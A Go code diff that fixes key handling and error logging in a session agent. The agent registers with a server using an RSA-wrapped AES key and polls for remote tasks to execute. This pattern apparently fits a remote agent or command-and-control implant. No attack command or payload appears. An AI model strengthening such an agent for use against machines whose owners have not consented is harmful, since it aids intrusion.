@@ -620,13 +620,24 @@ func (s *Session) register() error {
 
 	// 回退：RSA 密钥交换
 	if s.cfg.ServerPubKey != nil && s.keyEnc != nil {
+		// Generate a random AES key for RSA encryption fallback
+		if s.aesKey == nil {
+			key := make([]byte, 32)
+			if _, err := rand.Read(key); err != nil {
+				return fmt.Errorf("generate AES key for RSA fallback: %w", err)
+			}
+			s.aesKey = key
+		}
 		aesKeyEnc, err := s.keyEnc.EncryptWithServerKey(s.cfg.ServerPubKey, s.aesKey)
 		if err != nil {
 			log.Printf("[session] failed to encrypt AES key: %v", err)
-		} else {
-			reg.AESKeyEnc = aesKeyEnc
-			reg.PubKeyPEM = s.keyEnc.PublicKeyPEM()
+			return fmt.Errorf("encrypt AES key: %w", err)
 		}
+		reg.AESKeyEnc = aesKeyEnc
+		reg.PubKeyPEM = s.keyEnc.PublicKeyPEM()
+	} else {
+		// No key exchange available -- registration will be sent unencrypted
+		log.Printf("[session] WARNING: no key exchange or RSA pubkey available, registration sent in plaintext")
 	}
 
 	payloadBytes, _ := json.Marshal(reg)
@@ -738,7 +749,11 @@ func (s *Session) pollAndExecute() {
 	var pollResp struct {
 		Task *protocol.TaskPayload `json:"task"`
 	}
-	if err := json.Unmarshal(taskBytes, &pollResp); err != nil || pollResp.Task == nil {
+	if err := json.Unmarshal(taskBytes, &pollResp); err != nil {
+		log.Printf("[session] failed to parse poll response: %v (raw: %d bytes)", err, len(taskBytes))
+		return
+	}
+	if pollResp.Task == nil {
 		return
 	}
 
